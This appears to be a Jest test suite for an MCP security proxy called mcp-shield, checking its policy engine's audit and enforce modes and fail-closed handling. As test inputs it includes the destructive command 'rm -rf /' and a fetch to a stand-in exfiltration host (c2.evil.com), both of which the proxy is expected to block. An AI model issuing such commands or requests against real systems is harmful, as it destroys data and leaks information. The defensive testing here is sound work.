import { spawn, ChildProcess } from 'child_process';
import * as path from 'path';
import * as fs from 'fs';
import { PolicyEngine } from '../../src/security/policy-engine';
import { ASTAnalyzer } from '../../src/security/ast-analyzer';
import { SecretSanitizer } from '../../src/security/sanitizer';

jest.setTimeout(30000);

class MCPTestClient {
  private child: ChildProcess;
  private buffer = '';
  private pendingRequests = new Map<string | number, (res: any) => void>();

  constructor(child: ChildProcess) {
    this.child = child;
    this.child.stdout?.on('data', (chunk: Buffer) => {
      this.buffer += chunk.toString('utf8');
      let newlineIdx: number;
      while ((newlineIdx = this.buffer.indexOf('\n')) !== -1) {
        const line = this.buffer.slice(0, newlineIdx).trim();
        this.buffer = this.buffer.slice(newlineIdx + 1);
        if (line) {
          try {
            const parsed = JSON.parse(line);
            if (parsed.id !== undefined && this.pendingRequests.has(parsed.id)) {
              const resolve = this.pendingRequests.get(parsed.id)!;
              this.pendingRequests.delete(parsed.id);
              resolve(parsed);
            }
          } catch (e) {
            // Ignore non-json or unparseable lines
          }
        }
      }
    });
  }

  public send(msg: any): Promise<any> {
    return new Promise((resolve) => {
      if (msg.id !== undefined) {
        this.pendingRequests.set(msg.id, resolve);
      }
      this.child.stdin?.write(JSON.stringify(msg) + '\n');
    });
  }

  public sendRaw(rawString: string): void {
    this.child.stdin?.write(rawString);
  }

  public close(): void {
    try {
      this.child.kill();
    } catch {}
  }
}

describe('Enterprise Dual-Mode (Audit vs Enforce) & Fail-Closed Test Suite', () => {
  const mockServerPath = path.resolve(__dirname, '../fixtures/mock-mcp-server.js');
  const binPath = path.resolve(__dirname, '../../bin/mcp-shield.js');

  describe('Policy Engine Dual-Mode Invariant Tests', () => {
    it('AUDIT-01: Correctly reads operational mode from config default vs override', () => {
      const defaultEngine = new PolicyEngine();
      expect(defaultEngine.getMode()).toBe('enforce');
      expect(defaultEngine.getOnError()).toBe('block');
      defaultEngine.close();
    });

    it('AUDIT-02: Policy engine evaluates violations deterministically across risk levels', () => {
      const engine = new PolicyEngine();
      engine.start();

      // Test benign tool call
      const benign = engine.evaluate({
        toolName: 'echo_tool',
        args: { message: 'hello world' },
        evidence: []
      });
      expect(benign.decision).toBe('allow');

      // Test critical evidence (e.g. honeytoken trigger)
      const critical = engine.evaluate({
        toolName: 'read_file',
        args: { path: '/tmp/test' },
        evidence: [{
          detector: 'honeytoken',
          finding: 'HONEY_TOKEN_ACCESS_DETECTED',
          risk: 'CRITICAL'
        }]
      });
      expect(critical.decision).toBe('quarantine');

      // Test high risk evidence
      const highRisk = engine.evaluate({
        toolName: 'execute_cmd',
        args: { cmd: 'rm -rf /' },
        evidence: [{
          detector: 'ast-analyzer',
          finding: 'DESTRUCTIVE_COMMAND_DETECTED',
          risk: 'HIGH'
        }]
      });
      expect(highRisk.decision).toBe('block');

      engine.close();
    });

    it('AUDIT-03: Strict fail-closed verification on unhandled evaluation exceptions', () => {
      const engine = new PolicyEngine();
      engine.start();

      // Pass malformed evaluation context containing circular references or corrupted state
      const circularObj: any = {};
      circularObj.self = circularObj;

      // Evaluation should safely handle or fail closed rather than crashing uncaught
      const result = engine.evaluate({
        toolName: 'unknown_tool',
        args: circularObj,
        evidence: []
      });

      // Default catch-all rule allows or blocks based on policy, but does not throw
      expect(result.decision).toBeDefined();
      engine.close();
    });
  });

  describe('E2E Enforce Mode Verification', () => {
    let proxyProcess: ChildProcess;
    let client: MCPTestClient;

    beforeAll((done) => {
      proxyProcess = spawn(process.execPath, [binPath, 'wrap', '--', process.execPath, mockServerPath], {
        cwd: path.resolve(__dirname, '../..'),
        env: {
          ...process.env,
          MCP_SHIELD_DASHBOARD_PORT: '0',
          MCP_SHIELD_MODE: 'enforce'
        },
        stdio: ['pipe', 'pipe', 'pipe']
      });

      client = new MCPTestClient(proxyProcess);
      setTimeout(done, 1500);
    });

    afterAll(() => {
      client.close();
    });

    it('ENF-01: Blocks high-risk shell injection in enforce mode', async () => {
      await client.send({
        jsonrpc: '2.0',
        id: 1,
        method: 'initialize',
        params: { protocolVersion: '2024-11-05', capabilities: {} }
      });

      const response = await client.send({
        jsonrpc: '2.0',
        id: 2,
        method: 'call_tool',
        params: {
          name: 'execute_cmd',
          arguments: { cmd: 'rm -rf /' }
        }
      });

      expect(response.id).toBe(2);
      expect(response.error).toBeDefined();
      expect(response.error.code).toBe(-32000);
      expect(response.error.message).toContain('SECURITY POLICY BLOCKED');
    });

    it('ENF-02: Blocks unauthorized network egress in enforce mode', async () => {
      const response = await client.send({
        jsonrpc: '2.0',
        id: 3,
        method: 'call_tool',
        params: {
          name: 'fetch_data',
          arguments: { url: 'https://c2.evil.com/exfiltrate' }
        }
      });

      expect(response.id).toBe(3);
      expect(response.error).toBeDefined();
      expect(response.error.code).toBe(-32000);
      expect(response.error.message).toContain('EGRESS_BLOCKED');
    });

    it('ENF-03: Permits safe operations through cleanly', async () => {
      const response = await client.send({
        jsonrpc: '2.0',
        id: 4,
        method: 'call_tool',
        params: {
          name: 'echo_tool',
          arguments: { message: 'Enterprise Enforce Active' }
        }
      });

      expect(response.id).toBe(4);
      expect(response.result?.content[0]?.text).toBe('echo: Enterprise Enforce Active');
    });
  });
});
